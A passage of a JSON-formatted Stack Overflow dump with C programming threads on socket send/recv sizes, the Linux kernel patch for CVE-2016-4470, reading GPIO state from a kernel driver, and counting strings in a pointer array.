"https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 2, "creation_date": 1524679738, "post_id": 50028731, "comment_id": 87073615, "body": "you need <code>send(sock , &amp;arr,sizeof(arr) , 0);</code>"}, {"owner": {"reputation": 32321, "user_id": 173397, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pqKT8.jpg?s=128&g=1", "display_name": "pm100", "link": "https://stackoverflow.com/users/173397/pm100"}, "edited": false, "score": 2, "creation_date": 1524679799, "post_id": 50028731, "comment_id": 87073645, "body": "note - in general you need to send a length indicator before the message. TCP is a stream protocol not a message protocol, you cannot expect to receive the same messages tht you send, only the same bytes in  the same order"}, {"owner": {"reputation": 8430, "user_id": 2742717, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d1dec1aa6accf3589489ebd42634f7a0?s=128&d=identicon&r=PG", "display_name": "Swift - Friday Pie", "link": "https://stackoverflow.com/users/2742717/swift-friday-pie"}, "edited": false, "score": 1, "creation_date": 1524679918, "post_id": 50028731, "comment_id": 87073713, "body": "unless it is a datagramm mode (udp)"}, {"owner": {"reputation": 367, "user_id": 7006343, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fme6K.jpg?s=128&g=1", "display_name": "Ali Tahir", "link": "https://stackoverflow.com/users/7006343/ali-tahir"}, "edited": false, "score": 0, "creation_date": 1524680351, "post_id": 50028731, "comment_id": 87073910, "body": "i did the sizeof(arr) but its still the same"}, {"owner": {"reputation": 2135, "user_id": 4967497, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a0c6d09001cf39a7646ed2d22bc23352?s=128&d=identicon&r=PG", "display_name": "JojOatXGME", "link": "https://stackoverflow.com/users/4967497/jojoatxgme"}, "edited": false, "score": 1, "creation_date": 1524681103, "post_id": 50028731, "comment_id": 87074303, "body": "You need to use <code>sizeof</code> in <code>send</code> and <code>recv</code>."}, {"owner": {"reputation": 367, "user_id": 7006343, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fme6K.jpg?s=128&g=1", "display_name": "Ali Tahir", "link": "https://stackoverflow.com/users/7006343/ali-tahir"}, "edited": false, "score": 0, "creation_date": 1524681197, "post_id": 50028731, "comment_id": 87074360, "body": "oh Thanks Its working now ."}, {"owner": {"reputation": 1285, "user_id": 5974780, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/db181de522cb3dcfcddaeb95fa2925a3?s=128&d=identicon&r=PG&f=1", "display_name": "Nesan Mano", "link": "https://stackoverflow.com/users/5974780/nesan-mano"}, "edited": false, "score": 1, "creation_date": 1524681340, "post_id": 50028731, "comment_id": 87074435, "body": "it has to be the length in bytes of the data. Integer is 4 bytes and you have 3 integers to send so it would be 4*3= 12 bytes."}], "answers": [{"comments": [{"owner": {"reputation": 241, "user_id": 4058889, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-Y5kH-VbJDf8/AAAAAAAAAAI/AAAAAAAAAfE/Y9vZARB1UAw/photo.jpg?sz=128", "display_name": "Mert Can Erg&#252;n", "link": "https://stackoverflow.com/users/4058889/mert-can-erg%c3%bcn"}, "edited": false, "score": 2, "creation_date": 1524745430, "post_id": 50029152, "comment_id": 87101708, "body": "also a conversion may be needed if endianness of sender/receiver sides are different"}, {"owner": {"reputation": 2135, "user_id": 4967497, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a0c6d09001cf39a7646ed2d22bc23352?s=128&d=identicon&r=PG", "display_name": "JojOatXGME", "link": "https://stackoverflow.com/users/4967497/jojoatxgme"}, "edited": false, "score": 0, "creation_date": 1524746174, "post_id": 50029152, "comment_id": 87102226, "body": "Seems to be finde. However, I would use <code>size_t</code> as type for <code>length</code> and <code>ssize_t</code> as type for <code>sent</code>/<code>recvd</code>. It is also a little bit confusing that both functions use different return values. (<code>sendAll</code>: 0/OK, -1/IO Error; <code>recvAll</code>: 1/OK, 0/Unexpected EOF, -1/IO Error)"}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 2135, "user_id": 4967497, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a0c6d09001cf39a7646ed2d22bc23352?s=128&d=identicon&r=PG", "display_name": "JojOatXGME", "link": "https://stackoverflow.com/users/4967497/jojoatxgme"}, "edited": false, "score": 0, "creation_date": 1524754552, "post_id": 50029152, "comment_id": 87108485, "body": "@JojOatXGME many of the standard socket functions return 0 on success and -1 on error, so I followed that same convention for <code>sendAll()</code>. Since <code>recv()</code> has different semantics, <code>recvAll()</code> is similarly different."}], "tags": [], "owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "is_accepted": false, "score": 2, "last_activity_date": 1524754793, "last_edit_date": 1524754793, "creation_date": 1524681218, "answer_id": 50029152, "question_id": 50028731, "link": "https://stackoverflow.com/questions/50028731/problems-sending-an-integer-array-over-a-socket/50029152#50029152", "title": "Problems sending an integer array over a socket", "body": "<p><code>send()</code> and <code>recv()</code> operate on bytes only.  You are sending and receiving 3 bytes, but your array is actually <code>sizeof(int) * 3</code> bytes instead (where <code>sizeof(int)</code> is usually 4 on many platforms).  You need to use <code>sizeof()</code> on both ends, eg:</p>\n\n<pre><code>send(sock, &amp;arr, sizeof(arr), 0);\n</code></pre>\n\n<p></p>\n\n<pre><code>recv(new_socket, &amp;arr1, sizeof(arr1), 0);\n</code></pre>\n\n<p>However, you also have to pay attention to return values, because <code>send()</code> can send fewer bytes than requested, and <code>recv()</code> can receive fewer bytes than requested.  TCP is stream-oriented, not message-oriented. You should be calling <code>send()</code> and <code>recv()</code> each in a loop, re-calling each one until all expected bytes have been sent/received in full, eg:</p>\n\n<pre><code>ssize_t sendAll(int sckt, void *data, size_t length)\n{\n    char *bytes = (char*) data;\n    while (length &gt; 0)\n    {\n        ssize_t sent = send(sckt, bytes, length, 0);\n        if (sent == -1) return -1;\n        bytes += sent;\n        length -= sent;\n    }\n    return 0;\n}\n\nint arr[3] = {5, 4, 1};\nsendAll(sock, &amp;arr, sizeof(arr));\n</code></pre>\n\n<p></p>\n\n<pre><code>ssize_t recvAll(int sckt, void *data, size_t length)\n{\n    char *bytes = (char*) data;\n    while (length &gt; 0)\n    {\n        ssize_t recvd = recv(sckt, bytes, length, 0);\n        if (recvd &lt;= 0) return recvd;\n        bytes += recvd;\n        length -= recvd;\n    }\n    return 1;\n}\n\nint arr1[3];\nrecvAll(new_socket, &amp;arr1, sizeof(arr1));\n</code></pre>\n"}], "owner": {"reputation": 367, "user_id": 7006343, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fme6K.jpg?s=128&g=1", "display_name": "Ali Tahir", "link": "https://stackoverflow.com/users/7006343/ali-tahir"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 134, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1524754793, "creation_date": 1524679570, "last_edit_date": 1524680215, "question_id": 50028731, "link": "https://stackoverflow.com/questions/50028731/problems-sending-an-integer-array-over-a-socket", "title": "Problems sending an integer array over a socket", "body": "<p>I'm sending an integer array from client to server by socket. Like this ;</p>\n\n<pre><code>int arr[3] = {5, 4, 1};\n\n\nsend(sock , &amp;arr, 3 , 0);   //sending the votes count\n</code></pre>\n\n<p>and receiving in server like so</p>\n\n<pre><code>recv(new_socket, arr1, 3, 0);\n</code></pre>\n\n<p>I'm getting correct value in <code>arr1[0]</code> but in <code>arr1[1]</code> I'm getting <code>66</code> and <code>arr1[2]</code> I'm getting <code>67</code></p>\n\n<p>I don't know how this happening and where <code>66</code> and <code>67</code> is coming from</p>\n"}, {"tags": ["c", "security"], "answers": [{"tags": [], "owner": {"reputation": 181, "user_id": 4212894, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/eS1Mu.jpg?s=128&g=1", "display_name": "\u6155\u51ac\u4eae", "link": "https://stackoverflow.com/users/4212894/%e6%85%95%e5%86%ac%e4%ba%ae"}, "is_accepted": false, "score": 0, "last_activity_date": 1546680357, "creation_date": 1546680357, "answer_id": 54050676, "question_id": 50028519, "link": "https://stackoverflow.com/questions/50028519/cve-2016-4470-patch-information/54050676#54050676", "title": "CVE-2016-4470 Patch information", "body": "<ol>\n<li><p>Since the root cause of this CVE is that __key_link_begin fails, and variable edit is uninitialized, the method to fix this problem is to detect such failure of __key_link_begin. From my knowledge, link_ret is the return value of __key_link_begin(),\nthe patch adds one condition (<code>link_ret == 0</code>) to verify whether __key_link_begin fails or not.</p></li>\n<li><p>I think it should not involve race condition here. My guess is from  the stack trace shown in the <a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=38327424b40bcebe2de92d07312c89360ac9229a\" rel=\"nofollow noreferrer\">patch</a></p></li>\n<li><p>Please refer to the answer of Question 1.</p></li>\n</ol>\n"}], "owner": {"reputation": 11, "user_id": 9699434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7261d01ea065f24a2a3321e8af5adc73?s=128&d=identicon&r=PG&f=1", "display_name": "anon_user", "link": "https://stackoverflow.com/users/9699434/anon-user"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 45, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1546680357, "creation_date": 1524678831, "last_edit_date": 1524680683, "question_id": 50028519, "link": "https://stackoverflow.com/questions/50028519/cve-2016-4470-patch-information", "title": "CVE-2016-4470 Patch information", "body": "<p>Patch for CVE</p>\n\n<p><a href=\"https://i.stack.imgur.com/asfnV.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/asfnV.png\" alt=\"enter image description here\"></a></p>\n\n<p><strong>The description states :</strong> </p>\n\n<p>The <code>key_reject_and_link</code> function in <code>security/keys/key.c</code> in the Linux kernel through 4.6.3 does not ensure that a certain data structure is initialized, which allows local users to cause a denial of service (system crash) via vectors involving a crafted <code>keyctl</code> request2 command.</p>\n\n<p><strong>Questions:</strong></p>\n\n<ol>\n<li>Looking at the patch, how do the variables fix the bug? </li>\n<li>Does it involve race condition? Explanation would be extremely helpful, as I am new in C</li>\n<li>How exactly does this patch prevent a DOS condition</li>\n</ol>\n"}, {"tags": ["c", "linux", "arm", "gpio", "device-tree"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1524676411, "post_id": 50027855, "comment_id": 87071898, "body": "<a href=\"https://github.com/kidoman/embd/issues/30\" rel=\"nofollow noreferrer\">github.com/kidoman/embd/issues/30</a>"}, {"owner": {"reputation": 661, "user_id": 1919173, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/47c54768b7c9a5c85f1bf3370c48740e?s=128&d=identicon&r=PG", "display_name": "ArthurLambert", "link": "https://stackoverflow.com/users/1919173/arthurlambert"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1524728927, "post_id": 50027855, "comment_id": 87091218, "body": "It is not a bug or error of manipulation on export feature. this is completely normal. This is just because the gpio est already request by the kernel. I cannot use /sys/class/gpio."}], "answers": [{"comments": [{"owner": {"reputation": 661, "user_id": 1919173, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/47c54768b7c9a5c85f1bf3370c48740e?s=128&d=identicon&r=PG", "display_name": "ArthurLambert", "link": "https://stackoverflow.com/users/1919173/arthurlambert"}, "edited": false, "score": 0, "creation_date": 1525852002, "post_id": 50228498, "comment_id": 87513476, "body": "I will definitely work. But its more a workaround. Currently I have already a workaround. I add a char device and a ioctl call to get the gpio value... Buts thanks for the reply !"}], "tags": [], "owner": {"reputation": 13, "user_id": 9501163, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "JoeG", "link": "https://stackoverflow.com/users/9501163/joeg"}, "is_accepted": false, "score": 0, "last_activity_date": 1525766109, "last_edit_date": 1525766109, "creation_date": 1525765531, "answer_id": 50228498, "question_id": 50027855, "link": "https://stackoverflow.com/questions/50027855/read-gpio-value-through-dev-input-eventx/50228498#50228498", "title": "Read gpio value through /dev/input/eventX", "body": "<p>I read your other post as well. Not sure if this would work but perhaps you can dynamically load your <strong>gpio-keys.c</strong> driver as a loadable kernel module at run-time (via <code>insmod</code> or <code>modprobe</code>). </p>\n\n<p>So, perhaps you can first boot into your system before loading your <strong>gpio-keys.ko</strong> into the kernel. So, at that point, you could first read your gpio to determine its inital value: <code>cat /sys/class/gpio/gpio1/value</code>. Then once determining that value, you can then insert your kernel module <strong>gpio-keys.ko</strong> into your kernel. Hopefully at that point, your gpio-keys become available and hence you could use them as interrupts to wake your board from suspend mode.</p>\n"}], "owner": {"reputation": 661, "user_id": 1919173, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/47c54768b7c9a5c85f1bf3370c48740e?s=128&d=identicon&r=PG", "display_name": "ArthurLambert", "link": "https://stackoverflow.com/users/1919173/arthurlambert"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 824, "favorite_count": 1, "answer_count": 1, "score": 3, "last_activity_date": 1525852165, "creation_date": 1524676291, "last_edit_date": 1525852165, "question_id": 50027855, "link": "https://stackoverflow.com/questions/50027855/read-gpio-value-through-dev-input-eventx", "title": "Read gpio value through /dev/input/eventX", "body": "<p>I used to handle gpio in user space with /sys/class/gpio. Problem is that I need to use this gpio in a kernel driver. Due to the gpio request from the kernel driver, I cannot manipulate this gpio through /sys/class/gpio.</p>\n\n<p>However I was able to use it through /dev/input/eventX after declaring my gpio as gpio keys in a device tree. Problem is that I can only get event with this interface (new status) but not initial one. So until the first event, I cannot know the current status of my gpio.</p>\n\n<p>I tried to looking for over solution /sys/class/input/eventX and /sys/class/input/inputX without success.</p>\n\n<p>More complete question available here : <a href=\"https://www.mail-archive.com/kernelnewbies@kernelnewbies.org/msg18588.html\" rel=\"nofollow noreferrer\">https://www.mail-archive.com/kernelnewbies@kernelnewbies.org/msg18588.html</a></p>\n\n<p>Current dirty workaround that I used : Char device + ioctl</p>\n\n<pre><code>diff --git a/drivers/input/keyboard/gpio_keys.c b/drivers/input/keyboard/gpio_keys.c\nindex 77d7b07..99df807 100644\n--- a/drivers/input/keyboard/gpio_keys.c\n+++ b/drivers/input/keyboard/gpio_keys.c\n@@ -31,6 +31,16 @@\n #include &lt;linux/of_gpio.h&gt;\n #include &lt;linux/of_irq.h&gt;\n #include &lt;linux/spinlock.h&gt;\n+#include &lt;linux/cdev.h&gt;\n+#include &lt;linux/uaccess.h&gt;\n+\n+struct keys_dev {\n+       struct cdev dev;\n+       dev_t dev_no;\n+       struct class *cl;\n+};\n+\n+static struct keys_dev keys_inst;\n\n struct gpio_button_data {\n        const struct gpio_keys_button *button;\n@@ -55,6 +65,27 @@ struct gpio_keys_drvdata {\n        struct gpio_button_data data[0];\n };\n\n+\n+#define KEYS_DEVICE_NAME \"plug_status\"\n+#define GPIO_USB 1\n+\n+static long gpio_keys_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n+{\n+       int value = -1;\n+       int err;\n+\n+       value = gpio_get_value (GPIO_USB);\n+       value = !value;\n+       err = copy_to_user((char*)arg, &amp;value, sizeof(int));\n+       return value;\n+}\n+\n+static const struct file_operations gpio_keys_fops = {\n+       .owner = THIS_MODULE,\n+       .unlocked_ioctl = gpio_keys_ioctl,\n+};\n+\n+\n /*\n  * SYSFS interface for enabling/disabling keys and switches:\n  *\n@@ -851,11 +882,40 @@ static struct platform_driver gpio_keys_device_driver = {\n\n static int __init gpio_keys_init(void)\n {\n+       int r;\n+\n+       r = alloc_chrdev_region(&amp;keys_inst.dev_no , 0, 1, KEYS_DEVICE_NAME);\n+       if (r &lt; 0) {\n+               printk(KERN_ERR \"alloc_chrdev_region failed!\\n\");\n+               return -ENOMEM;\n+       }\n+       keys_inst.cl = class_create(THIS_MODULE, KEYS_DEVICE_NAME);\n+       if (keys_inst.cl == NULL) {\n+               printk(KERN_ERR \"Could not create class!\\n\");\n+               return -ENOMEM;\n+       }\n+\n+       if (device_create(keys_inst.cl, NULL, keys_inst.dev_no, NULL, KEYS_DEVICE_NAME) == NULL) {\n+               printk(KERN_ERR \"Could not create character device!\\n\");\n+               return -ENOMEM;\n+       }\n+\n+       cdev_init(&amp;keys_inst.dev, &amp;gpio_keys_fops );\n+       r = cdev_add(&amp;keys_inst.dev, keys_inst.dev_no, 1);\n+       if (r &lt; 0) {\n+               printk(KERN_ERR \"Could not add character device!\\n\");\n+               return -ENOMEM;\n+       }\n+\n        return platform_driver_register(&amp;gpio_keys_device_driver);\n }\n\n static void __exit gpio_keys_exit(void)\n {\n+\n+       device_destroy(keys_inst.cl, keys_inst.dev_no);\n+       class_destroy(keys_inst.cl);\n+       unregister_chrdev_region(keys_inst.dev_no, 1);\n        platform_driver_unregister(&amp;gpio_keys_device_driver);\n }\n</code></pre>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 1400, "user_id": 7305745, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fep6r.jpg?s=128&g=1", "display_name": "Daniele Cappuccio", "link": "https://stackoverflow.com/users/7305745/daniele-cappuccio"}, "edited": false, "score": 1, "creation_date": 1524675247, "post_id": 50027516, "comment_id": 87071282, "body": "What do you mean &#39;lengths of contents&#39;? The string with max size? min size? Average size? Or maybe the sum of the lengths?"}, {"owner": {"reputation": 52656, "user_id": 225074, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/dea26ac1ef8259140d28aa8b5ba4f1b3?s=128&d=identicon&r=PG", "display_name": "Thomas Matthews", "link": "https://stackoverflow.com/users/225074/thomas-matthews"}, "edited": false, "score": 0, "creation_date": 1524675415, "post_id": 50027516, "comment_id": 87071358, "body": "Since you tagged as C++, prefer to use <code>std::string</code> and <code>std::vector</code>."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 2, "creation_date": 1524675481, "post_id": 50027516, "comment_id": 87071388, "body": "In general, no.  If guaranteed NUL-terminated C-&#39;strings&#39; or the &#39;real&#39; C++ string type, then possibly.."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1524676384, "post_id": 50027516, "comment_id": 87071880, "body": "The sticking point, even with strings whose length can be determined, is the length of the pointer array, ie. the number of valid entries in it.  [MAX] does not suggest that length is fully defined in the question:("}], "answers": [{"comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1524675953, "post_id": 50027663, "comment_id": 87071635, "body": "...but that doesn&#39;t tell how many entries the array has (which I believe is the question)."}, {"owner": {"reputation": 2174, "user_id": 3349368, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/57c9f50cb5783614c67eef86caf63139?s=128&d=identicon&r=PG", "display_name": "Paul Belanger", "link": "https://stackoverflow.com/users/3349368/paul-belanger"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1524676674, "post_id": 50027663, "comment_id": 87072033, "body": "Oh. Then you want to loop over the range [0, MAX) and count the non-null entries in the table."}], "tags": [], "owner": {"reputation": 2174, "user_id": 3349368, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/57c9f50cb5783614c67eef86caf63139?s=128&d=identicon&r=PG", "display_name": "Paul Belanger", "link": "https://stackoverflow.com/users/3349368/paul-belanger"}, "is_accepted": false, "score": 0, "last_activity_date": 1524675616, "creation_date": 1524675616, "answer_id": 50027663, "question_id": 50027516, "link": "https://stackoverflow.com/questions/50027516/how-to-count-lengths-of-contents-of-an-array-of-pointers/50027663#50027663", "title": "How to count lengths of contents of an array of pointers", "body": "<p>If you know the strings are all null-terminated, you can use <a href=\"http://en.cppreference.com/w/c/string/byte/strlen\" rel=\"nofollow noreferrer\">strlen</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 15, "user_id": 9698177, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-HjXf8pkqfyY/AAAAAAAAAAI/AAAAAAAAAIc/ehbqZC5E1sQ/photo.jpg?sz=128", "display_name": "Dingani Makamo", "link": "https://stackoverflow.com/users/9698177/dingani-makamo"}, "edited": false, "score": 0, "creation_date": 1524678012, "post_id": 50027825, "comment_id": 87072733, "body": "Made a mistake on the <code>MAX</code>. its not supposed to be their."}], "tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": false, "score": 0, "last_activity_date": 1524676196, "creation_date": 1524676196, "answer_id": 50027825, "question_id": 50027516, "link": "https://stackoverflow.com/questions/50027516/how-to-count-lengths-of-contents-of-an-array-of-pointers/50027825#50027825", "title": "How to count lengths of contents of an array of pointers", "body": "<p>Your question is a bit confusing as it is not clear what length you want. Therefore for both possibilities:</p>\n\n<ol>\n<li>Length of array in use:</li>\n</ol>\n\n<p><code>char *str[MAX] = {\"kendrick\", \"lamar\"};</code> is an array of size MAX with two entries, which are pointers to strings. The compiler will initialize all other entries to zero, so counting how many entries of <code>str</code> are non-zero will give you that answer.</p>\n\n<ol start=\"2\">\n<li>Length of the strings:</li>\n</ol>\n\n<p>A string in C is null terminated. So for each entry of <code>str</code> that is not null you can advance and advance until you encounter a null character. That tells you the length of that entry.</p>\n"}, {"tags": [], "owner": {"reputation": 113, "user_id": 8267282, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a843b009122c6c6005590080e6bcf4b?s=128&d=identicon&r=PG&f=1", "display_name": "Bruno", "link": "https://stackoverflow.com/users/8267282/bruno"}, "is_accepted": false, "score": 2, "last_activity_date": 1524678523, "last_edit_date": 1524678523, "creation_date": 1524676306, "answer_id": 50027862, "question_id": 50027516, "link": "https://stackoverflow.com/questions/50027516/how-to-count-lengths-of-contents-of-an-array-of-pointers/50027862#50027862", "title": "How to count lengths of contents of an array of pointers", "body": "<p>You can verify if each pointer is NULL or not:</p>\n\n<pre><code>int count = 0;\nfor(int i = 0; i &lt; MAX; i++)\n    if(str[i] != NULL)\n        count++;\n\nprintf(\"Count: %d\\n\", count);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 1, "creation_date": 1524679073, "post_id": 50028548, "comment_id": 87073286, "body": "there is no C++/C language. Decide which one"}, {"owner": {"reputation": 1533, "user_id": 6204556, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/EJxCy.jpg?s=128&g=1", "display_name": "Shadi", "link": "https://stackoverflow.com/users/6204556/shadi"}, "reply_to_user": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1524722022, "post_id": 50028548, "comment_id": 87087378, "body": "@PeterJ_01: Why you say so? I did not get your point. would you please explain as I do not have much knowledge of C."}], "tags": [], "owner": {"reputation": 1533, "user_id": 6204556, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/EJxCy.jpg?s=128&g=1", "display_name": "Shadi", "link": "https://stackoverflow.com/users/6204556/shadi"}, "is_accepted": false, "score": 1, "last_activity_date": 1524691941, "last_edit_date": 1524691941, "creation_date": 1524678927, "answer_id": 50028548, "question_id": 50027516, "link": "https://stackoverflow.com/questions/50027516/how-to-count-lengths-of-contents-of-an-array-of-pointers/50028548#50028548", "title": "How to count lengths of contents of an array of pointers", "body": "<p>As noted by others, it is not clear what you are exactly asking about.</p>\n\n<p>In a hurry, I wrote the following code to give multiple outputs so you may find what you are looking for:</p>\n\n<p>1- Length of each item by using <a href=\"http://www.cplusplus.com/reference/cstring/strlen/\" rel=\"nofollow noreferrer\"><code>strlen()</code></a> function.(<code>ilength</code>)<br>\n2- Total length of the items by adding up individual lengths. (<code>ilength</code>).<br>\n3- Number of items in the array by counting non <code>NULL</code> (<code>items</code>).  </p>\n\n<pre><code>int main()\n{\n    const int MAX = 10;\n    char* str[MAX] = {\"Hello\", \" World\",\"!\",\"\"};\n\n    int ilength, length = 0, items = 0;\n\n    for(int i = 0; i &lt; MAX; ++i)\n        if (str[i] != NULL)\n        {   ilength = strlen (str[i]);\n            // WARNING!!! ISO C++ forbids converting a string constant to 'char*'\n            cout &lt;&lt; i &lt;&lt; \" item length is \" &lt;&lt; ilength &lt;&lt; \"\\n\";\n            length = length + ilength;\n            items += 1;\n        }\n\n    cout &lt;&lt; \"\\nTotal length of all items is: \" &lt;&lt; length &lt;&lt; \"\\n\\n\";\n    cout &lt;&lt; \"\\nThere is/are \" &lt;&lt; items &lt;&lt; \" in the array.\\n\\n\";\n}\n</code></pre>\n\n<hr>\n\n<p>NOTE: If you use C++ compiler, pay attention to the warning:</p>\n\n<p><code>WARNING!!! ISO C++ forbids converting a string constant to 'char*'</code></p>\n"}], "owner": {"reputation": 15, "user_id": 9698177, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-HjXf8pkqfyY/AAAAAAAAAAI/AAAAAAAAAIc/ehbqZC5E1sQ/photo.jpg?sz=128", "display_name": "Dingani Makamo", "link": "https://stackoverflow.com/users/9698177/dingani-makamo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "closed_date": 1524679564, "answer_count": 4, "score": -3, "last_activity_date": 1524691941, "creation_date": 1524675061, "last_edit_date": 1524679603, "question_id": 50027516, "link": "https://stackoverflow.com/questions/50027516/how-to-count-lengths-of-contents-of-an-array-of-pointers", "closed_reason": "Needs details or clarity", "title": "How to count lengths of contents of an array of pointers", "body": "<p>Is it possible to count the length of the contents of an array of pointers: \nFor example\n<code>char *str[MAX] = {\"kendrick\", \"lamar\"};</code>. the length of <code>str[0]</code> is 8 and <code>str[1]</code> is 5. Is there a way of getting these values.</p>\n"}, {"tags": ["c", "memory-management", "memory-leaks", "malloc", "free"], "comments": [{"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 3, "creation_date": 1524672442, "post_id": 50026722, "comment_id": 87069805, "body": "On a virtual memory system, the system tends not to commit pages until you actually use the memory.  And <code>free</code> tends not to return memory to the OS."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1524672443, "post_id": 50026722, "comment_id": 87069808, "body": "&quot; i get following memory usage&quot; - from <i>where</i> ?? Taskman ?? The sub-allocator for your implementation may be keeping the memory in a free list, still allocated from the OS, but ready for another round of (now much faster) allocations."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, 